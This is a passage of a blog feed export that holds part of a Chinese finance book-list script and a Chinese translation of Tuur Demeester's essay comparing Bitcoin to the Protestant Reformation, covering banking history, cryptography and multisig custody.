Livermore）的投机生涯。他把天赋、才华和热情倾注在金融市场上。他被人们称为“少年作手”和“华尔街巨熊”。他在14岁与人凑了5美元进场，15岁赚到一千美元，21岁赚到一万美元，24岁赚到五万美元，29岁身价百万美元，30岁身价三百万美元，52岁身价一亿美元。美国总统威尔逊曾亲自召见他，华尔街之王摩根先生也找人跟他协商。1929年，他做空股市赚走一亿美元，成为股票历史上疯狂的大空头。他一生四起四落，赢得很多的掌声，也留下很深的遗憾。他的操作经验至今仍是股市的教科书，被彼得·林奇、巴菲特、索罗斯、格雷厄姆等推崇。')\n\n        setBookInfo(8.2,8,'33464162','https://book.douban.com/subject/33464162/','https://img1.doubanio.com/view/subject/s/public/s33504428.jpg','货币的非国家化','  [英] 弗里德里希·冯·哈耶克','对多元货币理论与实践的分析')\n\n        setBookInfo(8.8,9,'26985299','https://book.douban.com/subject/26985299/','https://img9.doubanio.com/view/subject/s/public/s29585484.jpg','小岛经济学','彼得·希夫 / 安德鲁·希夫','你一定非常想知道：通货膨胀到底是怎么来的？<br>为什么中国要购买那么多的美国国债？<br>扭转恶化的经济状况是该花钱，还是存钱？<br>为什么有些国家很富有，而另外一些国家却很穷？<br>席卷全球的经济危机又是怎么发生的？')\n\n        setBookInfo(8.2,8,'30229576','https://book.douban.com/subject/30229576/','https://img2.doubanio.com/view/subject/s/public/s29774992.jpg','时间的玫瑰','但斌','投机和短线交易为什么常常会失败？<br>腾讯和茅台高速成长的逻辑是什么？<br>中国资本市场蓝筹时代正在到来？<br>跨过银行、地产，未来哪些行业更有机会？')\n\n        setBookInfo(6.2,6,'30401752','https://book.douban.com/subject/30401752/','https://piccdn3.umiwi.com/img/201812/26/201812261444463201066356.jpg?x-oss-process=image/resize,m_fill,h_320,w_240','城里的房子','徐远','无论是经济发展还是个人生活，在我们的生活中，关于房子的话题始终是一个热门话题，房产税、学区房、限购等话题，都是很多人日常生活中的热门话题，对于土地和房子，我们有着很多人所不能理解的执念。本书作者徐远是北京大学的老师，长期关注中国经济和金融的发展，做各种城市调研和企业研究，对于房子有着自己独特的看法。本书分为“房产配置， 远近高低各不同”“多维勾勒房市轮廓”“对标发达城市， 拨开中国房价迷雾”“房价的经济学透视”“短问快答，解开买房的 共同疑惑”五篇内容，可以说主要涵盖了我们关于房子讨论的热门问题。有理论，有实战，有答疑，相信对于我们对房子这件事的理解和把握，会有比较好的帮助，帮助我们读懂房产的财富逻辑。')\n\n        setBookInfo(7.2,7,'34438225','https://book.douban.com/subject/34438225/','https://img1.doubanio.com/view/subject/s/public/s33303467.jpg','第三道门',' [美]亚历克斯·班纳言 / Alex Banayan','《第三道门》将读者带入一场非同寻常的冒险——从比尔·盖茨的会客厅、陆奇的办公室、沃伦·巴菲特的股东大会，到杂货店里追逐拉里·金，再到为Lady Gaga出谋划策……<br>亚历克斯·班纳言讲述自己如何从大学宿舍出发，去追寻各行业的成功人士，探索他们在事业起步阶段，为实现梦想是如何另辟蹊径、突破自我的。')\n\n        setBookInfo(7.8,8,'34906885','https://book.douban.com/subject/34906885/','https://piccdn3.umiwi.com/img/201912/30/201912301311587477439036.jpg?x-oss-process=image/resize,m_fill,h_320,w_240','让时间陪你慢慢变富','李笑来','《让时间陪你慢慢变富》是一本写给普通人的书。<br>我自认是个普通人，2011年的春天，我误打误撞进入了投资领域。转眼8年过去，我做得很好，成绩相当不错。毫无疑问，是定投改变了我的命运。')\n\n</script>",
          "category": "",
          "link": "https://zhangdinghao.cn/2020/12/27/goodbye2020/",
          "creator": "",
          "pubDate": "2020-12-28T00:29:25.000Z",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "https://zhangdinghao.cn/2020/12/27/goodbye2020/",
          "language": "",
          "folder": "society",
          "feed": "zhangdinghao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "11b020e25d4c13d7a2adb99c7367e38b",
          "highlights": []
        },
        {
          "title": "比特币改革 The BitCoin Reformation",
          "description": "\n    \n      <p>作者：Adamant Research<br>译者：Thomas（第一译者）&amp; Jessie &amp; Maurice Lee<br>原作链接：<a href=\"https://docsend.com/view/ijd8qrs\" target=\"_blank\" r\n    \n    ",
          "content": "<p>作者：Adamant Research<br>译者：Thomas（第一译者）&amp; Jessie &amp; Maurice Lee<br>原作链接：<a href=\"https://docsend.com/view/ijd8qrs\" target=\"_blank\" rel=\"noopener\">https://docsend.com/view/ijd8qrs</a></p>\n<h2 style=\"margin-top: 30px; margin-bottom: 15px; padding: 0px; font-size: 22px; text-align: center; position: relative; font-weight: bold; color: black; line-height: 1.1em; padding-top: 12px; padding-bottom: 12px; margin: 70px 30px 30px; border: 1px solid #000;\"><span style=\"float: left; display: block; width: 90%; border-top: 1px solid #000; height: 1px; line-height: 1px; margin-left: -5px; margin-top: -17px;\"> </span><span class=\"prefix\" style=\"display: block; width: 3px; margin: 0 0 0 5%; height: 3px; line-height: 3px; overflow: hidden; background-color: #000; box-shadow: 3px 0 #000,\n    0 3px #000,\n    -3px 0 #000,\n    0 -3px #000;\"></span><span class=\"content\" style=\"display: block; -webkit-box-reflect: below 0em -webkit-gradient(linear,left top,left bottom, from(rgba(0,0,0,0)),to(rgba(255,255,255,0.1)));\">简介</span><span class=\"suffix\" style=\"display: block; width: 3px; margin: 0 0 0 95%; height: 3px; line-height: 3px; overflow: hidden; background-color: #000; box-shadow: 3px 0 #000,\n    0 3px #000,\n    -3px 0 #000,\n    0 -3px #000;\"></span><span style=\"float: right; display: block; width: 90%; border-bottom: 1px solid #000; height: 1px; line-height: 1px; margin-right: -5px; margin-top: 16px;\"> </span></h2>\n\n<p>在十六世纪末期，一群乌合之众般的叛逆知识份子和创业家建立了一个国家。这个国家位于欧洲大陆上最不受欢迎的一块土地，为了抵御过于频繁的洪水而建造百里壕沟。治水的同时，这个国家甚至与当时地表上最大的帝国进行了八十年的战争。</p>\n<p>这段挣扎的岁月、新思想的大熔炉熔铸出了荷兰与英国的黄金时期。创新的经济机构改变了世界。美国也进行了一场极其成功的社会经济实验：纽约市。</p>\n<p><strong>本作品的观点是</strong>：二十一世纪的比特币、加密技术、互联网、千禧一代远非潮流而已；他们一起预示了一波巨大的改变，其与十六、十七世纪的欧洲宗教改革有相似的特性。</p>\n<ul>\n<li>容许比特币或是反对比特币的立场将成为影响重大的政治立场分野 - 比特币网络的驱动力在存款、放贷、承销、承保</li>\n<li>合作型托管将成为产业标准</li>\n<li>境外银行业务可能将转变成比特币银行业务</li>\n<li>将快速成熟的领域：比特币债券、年金、借贷、保险</li>\n<li>IEO (交易所公开发行) 将成为常态且继续成长</li>\n<li>比特币持有者将加速这场思想改革</li>\n</ul>\n<h2 style=\"margin-top: 30px; margin-bottom: 15px; padding: 0px; font-size: 22px; text-align: center; position: relative; font-weight: bold; color: black; line-height: 1.1em; padding-top: 12px; padding-bottom: 12px; margin: 70px 30px 30px; border: 1px solid #000;\"><span style=\"float: left; display: block; width: 90%; border-top: 1px solid #000; height: 1px; line-height: 1px; margin-left: -5px; margin-top: -17px;\"> </span><span class=\"prefix\" style=\"display: block; width: 3px; margin: 0 0 0 5%; height: 3px; line-height: 3px; overflow: hidden; background-color: #000; box-shadow: 3px 0 #000,\n    0 3px #000,\n    -3px 0 #000,\n    0 -3px #000;\"></span><span class=\"content\" style=\"display: block; -webkit-box-reflect: below 0em -webkit-gradient(linear,left top,left bottom, from(rgba(0,0,0,0)),to(rgba(255,255,255,0.1)));\">目录</span><span class=\"suffix\" style=\"display: block; width: 3px; margin: 0 0 0 95%; height: 3px; line-height: 3px; overflow: hidden; background-color: #000; box-shadow: 3px 0 #000,\n    0 3px #000,\n    -3px 0 #000,\n    0 -3px #000;\"></span><span style=\"float: right; display: block; width: 90%; border-bottom: 1px solid #000; height: 1px; line-height: 1px; margin-right: -5px; margin-top: 16px;\"> </span></h2>\n\n<p>一：分析方法论</p>\n<p>二：改革的四个先决条件</p>\n<ul>\n<li>1/ 以租金为商业模式的垄断式服务提供者</li>\n<li>2/ 科技变革作为催化剂</li>\n<li>3/ 新经济阶级的诉求</li>\n<li>4/ 可信赖的防御策略和退出策略</li>\n<li>当时的教条对比今天的教条</li>\n</ul>\n<p>三：改革期间的金融、经济</p>\n<ul>\n<li>1/ 100% 存款准备率与严格的协议</li>\n<li>2/ 企业保险：谨慎的信任网络</li>\n<li>3/ 流动性高的担保作为放贷和衍生性金融商品的基础</li>\n<li>4/ 在通货紧缩的世界里获取资本</li>\n</ul>\n<p>四：结语</p>\n<p>五：附录</p>\n<ul>\n<li>早期的异议</li>\n<li>公开逆反</li>\n<li>镇压</li>\n<li>荷兰、新阿姆斯特丹、纽约</li>\n</ul>\n<p>后记</p>\n<h2 style=\"margin-top: 30px; margin-bottom: 15px; padding: 0px; font-size: 22px; text-align: center; position: relative; font-weight: bold; color: black; line-height: 1.1em; padding-top: 12px; padding-bottom: 12px; margin: 70px 30px 30px; border: 1px solid #000;\"><span style=\"float: left; display: block; width: 90%; border-top: 1px solid #000; height: 1px; line-height: 1px; margin-left: -5px; margin-top: -17px;\"> </span><span class=\"prefix\" style=\"display: block; width: 3px; margin: 0 0 0 5%; height: 3px; line-height: 3px; overflow: hidden; background-color: #000; box-shadow: 3px 0 #000,\n    0 3px #000,\n    -3px 0 #000,\n    0 -3px #000;\"></span><span class=\"content\" style=\"display: block; -webkit-box-reflect: below 0em -webkit-gradient(linear,left top,left bottom, from(rgba(0,0,0,0)),to(rgba(255,255,255,0.1)));\">一：过去是通向未来的钥匙</span><span class=\"suffix\" style=\"display: block; width: 3px; margin: 0 0 0 95%; height: 3px; line-height: 3px; overflow: hidden; background-color: #000; box-shadow: 3px 0 #000,\n    0 3px #000,\n    -3px 0 #000,\n    0 -3px #000;\"></span><span style=\"float: right; display: block; width: 90%; border-bottom: 1px solid #000; height: 1px; line-height: 1px; margin-right: -5px; margin-top: 16px;\"> </span></h2>\n\n<p>作为一个投资人和分析师，我的目标在于识别社会经济发展的趋势并对其演变作出预测。我阅读、筛选、分享。我听取那些值得信任的正直的专家，将噪音与信号分离。然而，最主要的挑战仍在于：世俗的趋势往往仅在事后才清晰可见。</p>\n<p>对此，我相信解法在于：<strong>识别与今天进程相似的多个历史观点</strong>。为了降低我成为趋势盲的可能性，我广泛的研读历史。阅读历史书籍与文章时，我的目标在于识别与今天趋势相近的、对称的历史趋势。这么做让我更加开放的思考各种互相牵连的因子，进而能对过去不可能想到的因果关系提出假说。我相信这么做让我能更准确的分析不同结果发生的机率，从而让我能更理性的进行投资和创业活动。</p>\n<p>过去我曾分析比特币和早期石油产业的相似 (联系)、和搜索引擎战争的相似 (联系)、和域名市场的相似 (联系)、和点对点文件分享的相似 (联系)、和互联网协议发展的相似 (联系)。但是，在这个被比特币日益影响的今天，我始终觉得自己没有掌握到时代脉搏的广度和深度 - <strong>直到我研读了新教改革的这段历史，我才感到自己对比特币的影响力有了深具潜力的蓝图</strong>。</p>\n<p>希望您在阅读本报告时能如同我进行研究时一样享受它。</p>\n<p>Sincerely,</p>\n<p>Tuur Demeester</p>\n<p>(引述：想要预测未来的人必须以史为鉴，因为人类世界的事件总是与过去事件相似。原因在于一个事实：这些事件背后的人们在过去、现在、未来都被同样的热情支配，因此这些事件必然拥有相似的结果 - 马基维利, 1517)</p>\n<h2 style=\"margin-top: 30px; margin-bottom: 15px; padding: 0px; font-size: 22px; text-align: center; position: relative; font-weight: bold; color: black; line-height: 1.1em; padding-top: 12px; padding-bottom: 12px; margin: 70px 30px 30px; border: 1px solid #000;\"><span style=\"float: left; display: block; width: 90%; border-top: 1px solid #000; height: 1px; line-height: 1px; margin-left: -5px; margin-top: -17px;\"> </span><span class=\"prefix\" style=\"display: block; width: 3px; margin: 0 0 0 5%; height: 3px; line-height: 3px; overflow: hidden; background-color: #000; box-shadow: 3px 0 #000,\n    0 3px #000,\n    -3px 0 #000,\n    0 -3px #000;\"></span><span class=\"content\" style=\"display: block; -webkit-box-reflect: below 0em -webkit-gradient(linear,left top,left bottom, from(rgba(0,0,0,0)),to(rgba(255,255,255,0.1)));\">二：改革的四个先决条件</span><span class=\"suffix\" style=\"display: block; width: 3px; margin: 0 0 0 95%; height: 3px; line-height: 3px; overflow: hidden; background-color: #000; box-shadow: 3px 0 #000,\n    0 3px #000,\n    -3px 0 #000,\n    0 -3px #000;\"></span><span style=\"float: right; display: block; width: 90%; border-bottom: 1px solid #000; height: 1px; line-height: 1px; margin-right: -5px; margin-top: 16px;\"> </span></h2>\n\n<p>回顾历史可以知道，新教改革之所以可能发生，有四个先决条件，而这四个先决条件在今天同样存在：垄断性服务提供者占主导地位的现况、科技催化变革、新的经济阶层的出现、以及叛逆者拥有可靠的防御策略与退出策略。</p>\n<h3 style=\"margin-top: 30px; margin-bottom: 15px; font-weight: bold; background-color: #000; color: #fff; padding: 2px 10px; width: fit-content; font-size: 17px; margin: 60px auto 10px;\"><span class=\"prefix\" style=\"display: none;\"></span><span class=\"content\">1/ 以租金为商业模式的垄断式服务提供者</span><span class=\"suffix\" style=\"display: none;\"></span></h3>\n\n<p>于 2002 年发表的论文 <strong>《对新教改革的经济学分析》</strong> 认为天主教会垄断了信仰服务的供应，同时，在法律系统里有话语权的信仰权威拥有能驱逐反对者的市场力量。（注 [1]）</p>\n<p><img src=\"/blogimg/20201012001.jpeg\" alt=\"\"></p>\n<p style=\"text-align: center;\">图 1：新教改革的经济学分析</p>\n\n<p>多个世纪以来，天主教会执行了非常重要的守门功能：守护天国之门，而门的钥匙即是由牧师提供的对罪的宽恕。该论文作者认为，若这个垄断的信仰权威对人⺠过度索取，将造成两种风险：(a) 人⺠可能选择从其他渠道获得信仰服务、(b) 世俗权威可能寻求另外的信仰服务提供者。这两者在新教改革期间都有发生。</p>\n<p>今天，我们关注的这个垄断服务提供者是国际货币与金融体系（注 [2]）。自从 1944 年布雷顿森林协议后，作为世界储备货币的美元一直享有通天般的特权。与十六世纪的天主教会相似，在法律系统里有话语权的金融权威拥有能驱逐反对者的市场力量。另外，<strong>以法币为准作结算的银行体系执行了重要的守门功能：</strong> <strong>守着通向世界财富与养老基金体系之门</strong>。</p>\n<p>在量化宽松、负利率、货币战争横行的今天，处于垄断的银行体系可能正在为它所提供的服务漫天要价 (这个体系的用户正在承担著通胀税)。这代表银行体系可能面临两种风险：(a) 人⺠可能选择从其他管道获得金融服务、(b) 世俗权威可能寻求另外的金融服务提供者。换言之，若比特币不断扩大其市场份额，大胆的猜测，可能最终他将被政治实体全面认可而成为合法的货币。</p>\n<p><img src=\"/blogimg/20201012002.jpeg\" alt=\"\"></p>\n<p style=\"text-align: center;\">图 2</p>\n\n<p>(插图：1559 年 Pieter Bruegel 绘製「The Fight between Carnival and Lent」的图中细节。Pieter 的公寓里捕捉到了十六世纪的大冲突：左边是放纵的逆反者，右边是衰弱的天主教会)</p>\n<p>(引述：「暂时征税变成永久征税，同时很多新的税制针对最富有的教会成员所制定。教会文件显示 […] 异端份子的儿子与孙子必须替他付钱赎罪 […] 只要缴纳相关费用，过世亲人的灵魂可以免于炼狱的惩罚。」— The Market Place of Christianity, P.117)</p>\n<h3 style=\"margin-top: 30px; margin-bottom: 15px; font-weight: bold; background-color: #000; color: #fff; padding: 2px 10px; width: fit-content; font-size: 17px; margin: 60px auto 10px;\"><span class=\"prefix\" style=\"display: none;\"></span><span class=\"content\">2/ 科技变革作为催化剂</span><span class=\"suffix\" style=\"display: none;\"></span></h3>\n\n<p>十六世纪时，多个改变世界的技术开始被广泛采用：印刷术让印出一本书的成本从整整一年劳动所获的收入降为买一只鸡的价格（注 [3]）；复式记帐法加速了国际贸易 (注 [4])；指南针与沙漏的改进让探险者能够探索未知地域并安全返还，解锁了世界大探险的进程 (注 [5])；科学研究的蓬勃发展促成技术发明的繁荣 (注 [6])。</p>\n<p>二十世纪晚期、二十一世纪早期时，几个重要的发明促成数字革命：通信技术和邮件系统让远程工作成为可能；计算机与资料储存的商业化大幅降低基础设施成本，从而降低新创公司的成本；开源软件为创业者提供稳固且免费的开发工具；密码学促成了整套防御技术和去信任资讯安全技术的发明；社交媒体容许快速的、无官僚介入的信息快速散布和传播。</p>\n<p><img src=\"/blogimg/20201012003.png\" alt=\"\"></p>\n<p style=\"text-align: center;\">图 3</p>\n\n<p>(图表：十五世纪时欧洲的书本价格每年下降 2.4%，持续一百年，同期间大学课程科学科目的占比上升 25-40%)</p>\n<p><img src=\"/blogimg/20201012004.png\" alt=\"\"></p>\n<p style=\"text-align: center;\">图 4</p>\n\n<p>(图表：1Mb/s 的网线价格二十年内降低了 99%，从最初的 10 万美金到现在的不到 10 美金）</p>\n<h3 style=\"margin-top: 30px; margin-bottom: 15px; font-weight: bold; background-color: #000; color: #fff; padding: 2px 10px; width: fit-content; font-size: 17px; margin: 60px auto 10px;\"><span class=\"prefix\" style=\"display: none;\"></span><span class=\"content\">3/ 新经济阶级的诉求</span><span class=\"suffix\" style=\"display: none;\"></span></h3>\n\n<p>十六、十七世纪时，横跨欧洲的海上贸易不断成长 (注 [7])。从瑞士绵延到英伦海峡的莱茵河是主要贸易干道， 低地国 (今天的荷兰、比利时) 的城市因为位于河口而享有天然的贸易活动优势。洲际航运活动也开始起飞，主要用于欧亚之间的香料贸易。贸易量的增加放大了科技创新对社会的影响，同时，法律完善的港口城市里专业化产业开始繁荣起来 - 绘画、布料、印刷、武器、地毯、教书、医药，这些产业的顶尖专家能为整个欧洲招来生意。随着贸易增加、技术创新与分工的日益专业化，整体社会的财富不断积累，同时农业在整体经济中的占比缩小，从而弱化了地主与教会的财富，促成了新的商人阶级的出现。</p>\n<p>今天，⻄方的阶级分化比较模糊。但是我们相信人口中特定比例的族群比其他族群更拥抱改变。拿千禧一代（以 96 年为分水岭）来说，他们对传统金融体系保持怀疑态度，热情拥抱数字变革。脸书 Facebook 在 2016 年做的调查发现，千禧一代中只有 8% 相信金融机构提供的建议、45% 愿意拥抱新选项 (注 [8])。另外，一篇 Transamerica Center for Retirement Services 做的调查显示千禧一代中 76% 相信 <strong>「和上一代相比，我们将更难获得社会保障」、</strong> 79% 担心 <strong>「当我们准备好退休的时候，已经没有了退休福利」</strong>(注 [9])。千禧一代在所有世代中最活跃的投资比特币 (注 [10])，同时这个群体也将预期在 2029 时成为拥有最多可支配收入的一代 (注 [11])。</p>\n<h3 style=\"margin-top: 30px; margin-bottom: 15px; font-weight: bold; background-color: #000; color: #fff; padding: 2px 10px; width: fit-content; font-size: 17px; margin: 60px auto 10px;\"><span class=\"prefix\" style=\"display: none;\"></span><span class=\"content\">4/ 可靠的防御策略和退出策略</span><span class=\"suffix\" style=\"display: none;\"></span></h3>\n\n<p>一个拥有良好的经济水平、教育水平与财富积累能力的公民，如果没有可靠的防御策略和退出策略，是不会选择与主流现状对抗的。</p>\n<p>长达八十年的荷兰起义 (比欧洲近代其他革命事件都历时更久) 并非偶然。这些被称为海上乞丐的革命份子无疑是驾驭水势的专家。1573 年荷兰人通过让周遭平原淹水的方法成功抵御⻄班牙人入侵 Alkmaar 市。同样的淹水策略成功摧毁⻄班牙关键的物资补给线。一年后又是同样的策略成功抵御⻄班牙人对荷兰教育中心 Lieden 镇的入侵。荷兰共和的⻄部阵线由「Waterline」所保卫：一连串足够靠近、能通过视线进行通讯的武装城镇，以及能在数小时之内策动淹水的周围土地。同时，因为靠近北海以及依靠其上庞大的舰队， 荷兰人拥有撤退、移⺠不列颠群岛的后备方案，以及在 17 世纪到来后转战北美洲的选择。</p>\n<p>在二十一世纪的今天，那些对经济现状持怀疑态度的叛逆者所拥有的自卫武器即是<strong>密码学</strong>  - 它实现了隐私保护与财产保护 (注 [12])。加密技术早已非常普及。举例来说，HTTPS 协定的普及率在 2014 年到 2018 年期间从 13% 上升到 77%(注 [13])。然而，如果服务提供者开后门让掌权人士获取权限的话，加密技术的意义何在？因此，我们观察到人们对数字身份自主权的兴趣与日俱增，尤其是拥抱比特币并对 VPN、Blockstack、wifi 网状网络 (注 [14])、Tor、Signal、Purism、U2F、PGP 等项目感兴趣的千禧一代。</p>\n<p>(引述：「1996 前出生的千禧一代是一群 911 事件发生时已足够成熟能够理解其前因后果、经历了 2008 金融危机，正在努力打拼的年轻群体。」— Pew Research 2018)</p>\n<p><img src=\"/blogimg/20201012005.jpeg\" alt=\"\"></p>\n<p style=\"text-align: center;\">图 5</p>\n\n<p>(插图：Relief of Liden, 1574。洪水冲破挡水墙进了田园，但同时也是洪水削弱了⻄班牙军队的势力，让荷兰援船得以赶到救援)</p>\n<p>(引述：「如果征服其他城市同样这么耗时，那么就算集齐全世界的财富与时间也不可能攻克荷兰的 24 个反抗城镇。」— ⻄班牙指挥官 Don Luis De Reqeusens, 1574)</p>\n<p>(引述：「密码学代表了隐私权的未来发展，同时依照逻辑也代表了货币、银行、金融的未来。[…] 如果给人们两个选项 — 要在一个处处留下详细电子证据的货币体系里生活，还是在一个与其平行却能保持匿名与隐私的货币体系里生活 — 人们将会选择后者。更有甚者，人们将会争取后者」— Orlin Grabbe, 1995)</p>\n<h3 style=\"margin-top: 30px; margin-bottom: 15px; font-weight: bold; background-color: #000; color: #fff; padding: 2px 10px; width: fit-content; font-size: 17px; margin: 60px auto 10px;\"><span class=\"prefix\" style=\"display: none;\"></span><span class=\"content\">当时的教条对比今天的教条</span><span class=\"suffix\" style=\"display: none;\"></span></h3>\n\n<p>从代表逆反运动本质的教条里我们可以观察到新教革命与比特币革命的相似处。当时的教条呼吁团结与坚持信念，一如今天的教条一般。</p>\n<p>十六世纪，路德教派改革运动的核心教义可以被总结为「Sola Fide」，直译是「相信足矣」，中译为 「因信称义」- 通向天堂的路上神父不是必须，信仰者的信仰与奉献足矣。另外一个在改革期间普及的教条是「Sola Scriptura」，直译是「圣经经文足矣」。这样的教条代表只认圣经为唯一不会堕落的权威。</p>\n<p>在今天的比特币圈子里，部分号召语往往被当作<strong>网络梗（memes）</strong> 因而不被接纳。我们认为，这些号召语代表逆反运动里的核心精神，可能预示着一场新的改革运动。其中一条是拉丁文「Vires in Numeris」(注 [15])，意即「数字即是力量」。Tyler Winklevoss 常被引述的一句话总结了这个教条的精神：“我们选择将自己的钱财与信心放在一个不受政治算计、人类失误的数学框架里。”(注 [16])</p>\n<p>另外一个广受比特币支持者欢迎的教条是「无需信任，只管验证」。这句话在 90 年代就已存在 (注 [17])，或许是美国前总统 Ronald Reagan 那句「相信它，但记得验证它」的变种 (注 [18])。这句话鼓励人们主动验证新开源软件的正当性；在比特币圈子里这句话鼓励人们主动验证链上的交易。<br>2013 年一篇论坛贴中发明了「HODL」一词，在今天代表一个比特币持有者无论价格再怎么波动都坚持持有 (注 [19])。最后，有个教条是「不是你的私钥，就不是你的比特币」，代表对第三方托管者的不信任 (注 [20])。</p>\n<p><img src=\"/blogimg/20201012006.jpeg\" alt=\"\"></p>\n<p style=\"text-align: center;\">图 6</p>\n\n<p>(插图：Christ and the Sheep Shed, 1524, Nurenberg。这幅有名的木板刻画宣传了因信称义的观念， 同时描绘天主教会掠夺羊棚、挥霍无度。)</p>\n<p>(引述：所谓必须拥有一个独立的货币，而不能只是基于现有法币开发更多私有的或防审查的付款方式， 这样的观念既不是由密码朋克也不是由学术界的密码学家所提出，而是自由主义未来派的信奉者所提出。 - Nick Szabo, 2019)</p>\n<h2 style=\"margin-top: 30px; margin-bottom: 15px; padding: 0px; font-size: 22px; text-align: center; position: relative; font-weight: bold; color: black; line-height: 1.1em; padding-top: 12px; padding-bottom: 12px; margin: 70px 30px 30px; border: 1px solid #000;\"><span style=\"float: left; display: block; width: 90%; border-top: 1px solid #000; height: 1px; line-height: 1px; margin-left: -5px; margin-top: -17px;\"> </span><span class=\"prefix\" style=\"display: block; width: 3px; margin: 0 0 0 5%; height: 3px; line-height: 3px; overflow: hidden; background-color: #000; box-shadow: 3px 0 #000,\n    0 3px #000,\n    -3px 0 #000,\n    0 -3px #000;\"></span><span class=\"content\" style=\"display: block; -webkit-box-reflect: below 0em -webkit-gradient(linear,left top,left bottom, from(rgba(0,0,0,0)),to(rgba(255,255,255,0.1)));\">三：改革期间的金融、经济</span><span class=\"suffix\" style=\"display: block; width: 3px; margin: 0 0 0 95%; height: 3px; line-height: 3px; overflow: hidden; background-color: #000; box-shadow: 3px 0 #000,\n    0 3px #000,\n    -3px 0 #000,\n    0 -3px #000;\"></span><span style=\"float: right; display: block; width: 90%; border-bottom: 1px solid #000; height: 1px; line-height: 1px; margin-right: -5px; margin-top: 16px;\"> </span></h2>\n\n<p>改革期间我们目睹了一个新兴的文化与经济阶级试图在一个波动性高且充满变化、充满敌意的环境里试图自我保护。这是一个由各自乖僻的经济参与者组成的网络，每一个人都对自己的信念全身心的投入， 完全背离传统做生意的方式，并且拥有非常有效的防御机制。</p>\n<p><img src=\"/blogimg/20201012007.jpeg\" alt=\"\"></p>\n<p style=\"text-align: center;\">图 7</p><p><br>(插图：马里纳斯 · 范 · 雷默斯威尔的绘画作品《税务员》，1542 年。)<br><br></p><h3 style=\"margin-top: 30px; margin-bottom: 15px; font-weight: bold; background-color: #000; color: #fff; padding: 2px 10px; width: fit-content; font-size: 17px; margin: 60px auto 10px;\"><span class=\"prefix\" style=\"display: none;\"></span><span class=\"content\">1/ 100% 存款准备金率与严格的协议</span><span class=\"suffix\" style=\"display: none;\"></span></h3><br><br>1609 年时，荷兰的商人与政府官员联合创立了 Amsterdam Wisselbank (AWB)，其满足了两个需求：<br><br>第一，它将保护来自荷兰南部和其他地方的商人难⺠带来的黄金与白银；第二，它将发布具有国际公信力、以荷兰盾来计算价值的银行票据和汇票。<br><br><strong>AWB 当年的安全机制举世无双</strong>。它位于阿姆斯特丹市里，受长达五十里壕沟的 Dutch Waterline 所保卫。AWB 的金库与营运皆位于市中心最醒目的位置：市政厅。同时，该银行的组织架构显示了其对肩负信托责任的绝对决心。AWB 由 4 个委员共同领导，并决不允许办公室里只有一位委员的情况发生。这些委员管理了下面四名记帐员、四名监察员，三名收款员，以及一名贵金属验证师。为了防治诈欺，每位记帐员只负责其专门的业务 (注 [21]) 。当时商贸实力顶尖的荷兰东印度公司在 AWB 有专门帐户，并只通过 AWB 进行付款 （注 [22])。<br><br>尽管号称完全准备金的 AWB 在无担保贷款事发后蒙上阴影，十七世纪时它的声誉依旧举世无敌，同时，它的稳定与可靠也促成荷兰共和国当时的繁荣。到了 1776 年仍有 <strong>亚当 · 斯密在《国富论》里赞誉 AWB 的银行票据比法币更加优越。</strong> 要知道 AWB 的服务并不便宜：它对金币托管、开户、交易皆收取 1% 年费，并对提款收取 1.5% 的费用。但总体而言，AWB 的银行票据代表着折扣：每张票据的价值比其所挂钩的实体金属币价值高出一截。<br><br>我们预测，在面对第三方的挤兑、财产盗窃与损失风险、以及长期法规环境的不确定性时，比特币社群将日渐采纳安全性较高、无需太多信任的<strong>比特币存款</strong>的服务。<br><br><strong>对信任需求最低的解决方案，正是那些让盗窃或诈欺极度不可行的设计方案。</strong> 延迟机制和程式化多签机制的出现，让我们看到了极具说服力且牢固的托管解决方案的开端，因为它们代表前所未见的高安全水平。我们对最近被提出的多种智能合约方案充满信心，例如 Bob McElrath （注 [23]), Byran Bishop （注 [24]), 以及 Pieter Wuille （注 [25]) 各自提出的方案等等。依照这样的逻辑，越来越多的多重签名比特币贮存方案可能预示着一个更大趋势的到来。截至 2019 年十月，比特币总流通量的 32% 贮存于隐私保护性更高的 P2SH 地址格式，而 12% 则贮存于多重签名地址里 (2014 年是 0%) （注 [26])。<br><br><img src=\"/blogimg/20201012008.jpeg\" alt=\"\"><p style=\"text-align: center;\">图 8</p>\n\n<p>(插图：阿姆斯特丹威塞尔银行用来运送金币的马车)</p>\n<p>(引述：“[…] 一种交易设置方案，将用户和攻击者绑定在一起，在弱安全的热键被允许任意使用硬币之前，总是使用公共观察和延迟时间。在延迟期间，有机会启动恢复 / 回收，这可以触发更深的冷储存参数或 […] 重置延迟时间。” Byran Bishop 描述了 2019 年的多签、预签保险库计划)</p>\n<h3 style=\"margin-top: 30px; margin-bottom: 15px; font-weight: bold; background-color: #000; color: #fff; padding: 2px 10px; width: fit-content; font-size: 17px; margin: 60px auto 10px;\"><span class=\"prefix\" style=\"display: none;\"></span><span class=\"content\">2/ 企业保险 - 谨慎的信任网络</span><span class=\"suffix\" style=\"display: none;\"></span></h3>\n\n<p>十六世纪时，随着海上贸易活动急速增长，人们需要相应的金融工具来对冲贸易带来的风险。最早的海上保险产品是 <strong>「海上贷款」</strong>，由于在船只安全返港后才还款，其贷款利率特别高。这种合约对于不了解该次航行潜在利润的投资人而言特别有用。另一种选项是 <strong>「commenda contract」</strong>，让投资人有权与船长共享成功返航的利润，这个亮点是船长自己也是投资人。一般来说，船长出三分之一的成本，投资人出四分之一。返航之后，投资人拿四分之三的利润，旅行者拿四分之一。</p>\n<p>这两种海上保险产品都并非完美 （注 [27])。早期的保险合约在意大利开始实行，其中商人自己作为核保人，这样的模式后来<strong>催生了保户互助的互助保险合约</strong>。到了十六世纪时保险合约的使用已扩散到英国、法国、荷兰、⻄班牙。对于商人来说，索赔是一个挑战。由于服务可靠性参差不齐，若是找错了保险服务提供商，商人可能追索无门。在仍不成熟的航运市场里，由于信息不对称，对于保险业者来说最大的风险是代理风险 - 即商人有时会过度承保、故意沉船，甚至替已经失踪的船只买保险。</p>\n<p>在双方风险都如此巨大的情形下，商人必须缴纳高额保险费给品质高的保险服务商，而服务商们则往往选择只卖保险给可信任的商人。其他决定保险费率的因素包括保险服务商的财务状况，以及所在城市的法治文化。阿姆斯特丹和威尼斯官方就不断的尝试设立保险经纪人的牌照核发和推动公会，但始终没能流行起来。</p>\n<p><img src=\"/blogimg/20201012009.jpeg\" alt=\"\"></p>\n<p style=\"text-align: center;\">图 9</p>\n\n<p>(插图：威廉 · 凡 · 德 · 维尔德绘的一艘荷兰商船 